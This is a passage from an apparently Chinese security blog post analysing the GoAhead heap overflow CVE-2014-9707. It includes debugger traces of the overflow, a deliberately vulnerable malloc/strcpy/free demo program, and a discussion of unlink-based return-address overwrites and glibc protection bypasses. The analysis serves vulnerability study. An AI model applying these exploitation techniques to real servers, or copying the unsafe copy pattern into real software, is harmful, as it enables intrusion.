&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(i&nbsp;=&nbsp;0,&nbsp;dp&nbsp;=&nbsp;path;&nbsp;i&nbsp;&lt;&nbsp;nseg;&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(dp,&nbsp;segments[i]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;len&nbsp;=&nbsp;(int)&nbsp;slen(segments[i]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dp&nbsp;+=&nbsp;len;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(++i&nbsp;&lt;&nbsp;nseg&nbsp;||&nbsp;(nseg&nbsp;==&nbsp;1&nbsp;&amp;&amp;&nbsp;*segments[0]&nbsp;==&nbsp;&#39;\0&#39;&nbsp;&amp;&amp;&nbsp;firstc&nbsp;==&nbsp;&#39;/&#39;))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*dp++&nbsp;=&nbsp;&#39;/&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*dp&nbsp;=&nbsp;&#39;\0&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;}
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里会根据nseg执行strcpy操作，由于之前的问题，会导致拷贝超过dp本身的大小，也就是1034，来看一下到底拷贝了多少内容。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
1:Breakpoint&nbsp;5,&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3232
3232&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(++i&nbsp;&lt;&nbsp;nseg&nbsp;||&nbsp;(nseg&nbsp;==&nbsp;1&nbsp;&amp;&amp;&nbsp;*segments[0]&nbsp;==&nbsp;&#39;\0&#39;&nbsp;&amp;&amp;&nbsp;firstc&nbsp;==&nbsp;&#39;/&#39;))&nbsp;{
gdb-peda$&nbsp;n
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0x0&nbsp;
2:Breakpoint&nbsp;5,&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3232
3232&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(++i&nbsp;&lt;&nbsp;nseg&nbsp;||&nbsp;(nseg&nbsp;==&nbsp;1&nbsp;&amp;&amp;&nbsp;*segments[0]&nbsp;==&nbsp;&#39;\0&#39;&nbsp;&amp;&amp;&nbsp;firstc&nbsp;==&nbsp;&#39;/&#39;))&nbsp;{
gdb-peda$&nbsp;n
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0x3&nbsp;
3:Breakpoint&nbsp;5,&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3232
3232&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(++i&nbsp;&lt;&nbsp;nseg&nbsp;||&nbsp;(nseg&nbsp;==&nbsp;1&nbsp;&amp;&amp;&nbsp;*segments[0]&nbsp;==&nbsp;&#39;\0&#39;&nbsp;&amp;&amp;&nbsp;firstc&nbsp;==&nbsp;&#39;/&#39;))&nbsp;{
gdb-peda$&nbsp;c
Continuing.
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0x132&nbsp;
4:Breakpoint&nbsp;5,&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3232
3232&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(++i&nbsp;&lt;&nbsp;nseg&nbsp;||&nbsp;(nseg&nbsp;==&nbsp;1&nbsp;&amp;&amp;&nbsp;*segments[0]&nbsp;==&nbsp;&#39;\0&#39;&nbsp;&amp;&amp;&nbsp;firstc&nbsp;==&nbsp;&#39;/&#39;))&nbsp;{
gdb-peda$&nbsp;c
Continuing.
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0x3
6:Breakpoint&nbsp;5,&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3232
3232&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(++i&nbsp;&lt;&nbsp;nseg&nbsp;||&nbsp;(nseg&nbsp;==&nbsp;1&nbsp;&amp;&amp;&nbsp;*segments[0]&nbsp;==&nbsp;&#39;\0&#39;&nbsp;&amp;&amp;&nbsp;firstc&nbsp;==&nbsp;&#39;/&#39;))&nbsp;{
gdb-peda$&nbsp;c
Continuing.
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0x2&nbsp;
7:Breakpoint&nbsp;5,&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3232
3232&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(++i&nbsp;&lt;&nbsp;nseg&nbsp;||&nbsp;(nseg&nbsp;==&nbsp;1&nbsp;&amp;&amp;&nbsp;*segments[0]&nbsp;==&nbsp;&#39;\0&#39;&nbsp;&amp;&amp;&nbsp;firstc&nbsp;==&nbsp;&#39;/&#39;))&nbsp;{
gdb-peda$&nbsp;c
Continuing.
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0x2c2&nbsp;
8:Breakpoint&nbsp;5,&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3232
3232&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(++i&nbsp;&lt;&nbsp;nseg&nbsp;||&nbsp;(nseg&nbsp;==&nbsp;1&nbsp;&amp;&amp;&nbsp;*segments[0]&nbsp;==&nbsp;&#39;\0&#39;&nbsp;&amp;&amp;&nbsp;firstc&nbsp;==&nbsp;&#39;/&#39;))&nbsp;{
gdb-peda$&nbsp;c
Continuing.
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0x2c2&nbsp;
Breakpoint&nbsp;7,&nbsp;0xb7fb6618&nbsp;in&nbsp;websNormalizeUriPath&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;pathArg=0x805bcc0&nbsp;&quot;/y\005\b/y\005\b\230\362\377\277?y\005\b&quot;,&nbsp;&#39;A&#39;&nbsp;&lt;repeats&nbsp;184&nbsp;times&gt;...)&nbsp;at&nbsp;src/http.c:3238
3238&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wfree(dupPath);
3+132+3+2+2c2+2c2&nbsp;=&nbsp;6be&nbsp;=&nbsp;1726
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，一共拷贝了8次，总共拷贝了1726，在整个拷贝过程中，eax监视的是拷贝的长度，算一下总和，已经超过了1034，那么由此就会造成堆溢出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来执行，发生堆溢出，到达漏洞位置。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
gdb-peda$&nbsp;c
Continuing.
Program&nbsp;received&nbsp;signal&nbsp;SIGABRT,&nbsp;Aborted.
[----------------------------------registers-----------------------------------]
EAX:&nbsp;0x0&nbsp;
EBX:&nbsp;0xef3&nbsp;
ECX:&nbsp;0xef3&nbsp;
EDX:&nbsp;0x6&nbsp;
ESI:&nbsp;0x45&nbsp;(&#39;E&#39;)
EDI:&nbsp;0xb7eec000&nbsp;--&gt;&nbsp;0x1a5da8&nbsp;
EBP:&nbsp;0xbffff178&nbsp;--&gt;&nbsp;0x805cb30&nbsp;--&gt;&nbsp;0x73&nbsp;(&#39;s&#39;)
ESP:&nbsp;0xbfffeeb4&nbsp;--&gt;&nbsp;0xbffff178&nbsp;--&gt;&nbsp;0x805cb30&nbsp;--&gt;&nbsp;0x73&nbsp;(&#39;s&#39;)
EIP:&nbsp;0xb7fdebe0&nbsp;(&lt;__kernel_vsyscall+16&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;ebp)
EFLAGS:&nbsp;0x206&nbsp;(carry&nbsp;PARITY&nbsp;adjust&nbsp;zero&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
[-------------------------------------code-------------------------------------]
&nbsp;&nbsp;&nbsp;0xb7fdebdc&nbsp;&lt;__kernel_vsyscall+12&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;0xb7fdebdd&nbsp;&lt;__kernel_vsyscall+13&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nop
&nbsp;&nbsp;&nbsp;0xb7fdebde&nbsp;&lt;__kernel_vsyscall+14&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;0x80
=&gt;&nbsp;0xb7fdebe0&nbsp;&lt;__kernel_vsyscall+16&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;ebp
&nbsp;&nbsp;&nbsp;0xb7fdebe1&nbsp;&lt;__kernel_vsyscall+17&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;edx
&nbsp;&nbsp;&nbsp;0xb7fdebe2&nbsp;&lt;__kernel_vsyscall+18&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;ecx
&nbsp;&nbsp;&nbsp;0xb7fdebe3&nbsp;&lt;__kernel_vsyscall+19&gt;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;0xb7fdebe4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int3
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">总结一下整个漏洞的形成过程，在goahead中，程序会开启监听socket进程，之后会有一个函数用于处理接收到的数据包。在收到url后，会对url进行进一步处理，在处理的过程中，由于对.的控制逻辑混乱，导致处理结束后的判断长度和之前的长度不等，从而可以导致超长串考入先前申请长度的缓冲区，引发堆溢出漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">从漏洞分析到漏洞模型</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">实际上要利用这个漏洞，其实对于Linux二进制攻防熟悉的大牛肯定已经知道就是利用unlink来对堆进行攻击，其实这个漏洞非常有意思，是因为它有一个非常基础的漏洞模型，下面我们一起来把这个漏洞模型还原出来。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先我们再来回顾一下发生漏洞的源码部分。<br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
PUBLIC&nbsp;char&nbsp;*websNormalizeUriPath(char&nbsp;*pathArg)
{
&nbsp;&nbsp;&nbsp;&nbsp;……&nbsp;省略一部分
&nbsp;&nbsp;&nbsp;&nbsp;len&nbsp;=&nbsp;(int)&nbsp;slen(pathArg);
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((dupPath&nbsp;=&nbsp;walloc(len&nbsp;+&nbsp;2))&nbsp;==&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NULL;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;strcpy(dupPath,&nbsp;pathArg);
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((segments&nbsp;=&nbsp;walloc(sizeof(char*)&nbsp;*&nbsp;(len&nbsp;+&nbsp;1)))&nbsp;==&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;NULL;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;nseg&nbsp;=&nbsp;len&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;firstc&nbsp;=&nbsp;*dupPath;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(mark&nbsp;=&nbsp;sp&nbsp;=&nbsp;dupPath;&nbsp;*sp;&nbsp;sp++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(*sp&nbsp;==&nbsp;&#39;/&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*sp&nbsp;=&nbsp;&#39;\0&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;(sp[1]&nbsp;==&nbsp;&#39;/&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sp++;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;segments[nseg++]&nbsp;=&nbsp;mark;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;len&nbsp;+=&nbsp;(int)&nbsp;(sp&nbsp;-&nbsp;mark);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mark&nbsp;=&nbsp;sp&nbsp;+&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;……省略一部分
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;nseg&nbsp;=&nbsp;j;
&nbsp;&nbsp;&nbsp;&nbsp;assert(nseg&nbsp;&gt;=&nbsp;0);
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((path&nbsp;=&nbsp;walloc(len&nbsp;+&nbsp;nseg&nbsp;+&nbsp;1))&nbsp;!=&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(i&nbsp;=&nbsp;0,&nbsp;dp&nbsp;=&nbsp;path;&nbsp;i&nbsp;&lt;&nbsp;nseg;&nbsp;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(dp,&nbsp;segments[i]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……省略一部分
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*dp&nbsp;=&nbsp;&#39;\0&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;wfree(dupPath);
&nbsp;&nbsp;&nbsp;&nbsp;wfree(segments);
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">有几个地方值得关注，首先是刚刚进入函数的时候，有一处申请堆操作</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;&nbsp;&nbsp; if ((dupPath = walloc(len + 2)) == 0) {</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">紧接着第二处申请堆操作</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;&nbsp;&nbsp; if ((segments = walloc(sizeof(char*) * (len + 1))) == 0) {</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后是第三处申请堆操作</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;&nbsp;&nbsp; if ((path = walloc(len + nseg + 1)) != 0) {</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">紧接着会对两个堆空间进行free操作</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;&nbsp;&nbsp; wfree(dupPath);</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;&nbsp;&nbsp; wfree(segments);</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">经过之前的分析，问题出现在path申请堆空间后的strcpy后，其实看到这里可以很明朗的看出一些东西，我们来看一张对比图。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0120cd4ed2d96d61b6.png" title="t01f8ee9c0bfccad56f.png" alt="http://p0.qhimg.com/t01f8ee9c0bfccad56f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">阅读过堆溢出漏洞的小伙伴肯定对右面图中的代码很熟悉，实际上，CVE-2014-9707这个漏洞，分析完这个漏洞的成因之后，可以还原成一个最常见的unlink漏洞利用的模型！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
#include&nbsp;&lt;stdlib.h&gt;
#include&nbsp;&lt;string.h&gt;
int&nbsp;main(&nbsp;int&nbsp;argc,&nbsp;char&nbsp;*&nbsp;argv[]&nbsp;)
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*&nbsp;first,&nbsp;*&nbsp;second;
/*[1]*/&nbsp;first&nbsp;=&nbsp;malloc(&nbsp;660&nbsp;);
/*[2]*/&nbsp;second&nbsp;=&nbsp;malloc(&nbsp;660&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(argc!=1)
/*[3]*/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(&nbsp;second,&nbsp;argv[1]&nbsp;);
/*[4]*/&nbsp;free(&nbsp;first&nbsp;);
/*[5]*/&nbsp;free(&nbsp;second&nbsp;);
/*[6]*/&nbsp;return(&nbsp;0&nbsp;);
}
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来，我们来看一下这个漏洞申请堆空间的布局。</span></p><p style="text-align:center"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 2em;"><img src="http://p5.qhimg.com/t01e743703fc3ac3c66.png" title="t011e742dc39c695039.png" alt="http://p2.qhimg.com/t011e742dc39c695039.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-align: left; text-indent: 2em;">我们可以看到，根据malloc的情况，可以将申请的空间做如下布局，top chunk是未被分配的堆空间，path所处的chunk，是可控的，也就是上面给出模型中的second部分，argv［1］就相当于我们在实战中要拷贝的堆空间。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">也就是说，当我们在demo中，找到一个合适的payload，导致返回地址被修改成shellcode地址，或者system地址等等，无论怎么样，都能达到最后的利用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里我需要多说几句，如果仔细看过上面的demo和以前unlink的文章比较的话，会发现我拷贝的是第二个缓冲区，也就是说在free（second）的时候，才有可能会出发unlink，而不是free（first），这是因为在实战中，free（segment）的时候才会出发漏洞，所以利用覆盖got表中free地址替换为shellcode或者system函数的方法并不可用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里还是要利用覆盖返回地址的方法。关于unlink的触发机制在unlink的各种文档中都有详细描述，简单的描述 理解大致就是空闲块合并操作，释放块的时候，通过欺骗某chunk header来达到令系统认为A块的前面一块活着后面一块是空闲的，这样就会触发A块脱链，触发unlink宏，当然，这里A块不一定是当前块，也有可能是当前块的下一块。 </span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">glibc保护机制与绕过</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在不断的版本更新中，glibc对抗堆溢出漏洞的手法层出不穷，在不断的演变中，我们需要面对不同的防护机制，这里通过对比分析和实战，我总结了glibc在进化过程中的变化和利用方法。很多利用在以前unlink的文章中都有描述，我在文末的参考文章中都已经指出，这里就不再进行赘述。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先来看一下glibc 2.1.1版本中，关于unlink宏的定义。malloc.c第2344行。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
#define&nbsp;unlink(P,&nbsp;BK,&nbsp;FD)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
